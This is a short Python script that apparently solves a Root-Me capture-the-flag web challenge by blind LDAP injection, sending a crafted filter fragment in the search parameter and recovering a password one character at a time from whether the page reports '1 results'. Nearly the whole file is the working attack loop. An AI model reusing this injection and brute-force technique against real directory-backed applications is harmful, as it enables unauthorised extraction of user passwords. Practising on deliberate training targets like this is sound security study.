import requests
from bs4 import BeautifulSoup as bs
import string

alphabet = string.ascii_letters + string.digits
punctuation = '!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~'
url = "http://challenge01.root-me.org/web-serveur/ch26/?action=dir&search=%29%28%26%29%28password%3D"

passw=""
s = requests.Session()
for t in range(15):
	for x in alphabet:
		r = s.get(url+passw+x)
		soap = bs(r.content, "html.parser")
		p = soap.find('p')
		#print(p.text+" === "+x)
		if p.text.find("1 results")!=-1:
			passw+=x
			break
print(passw)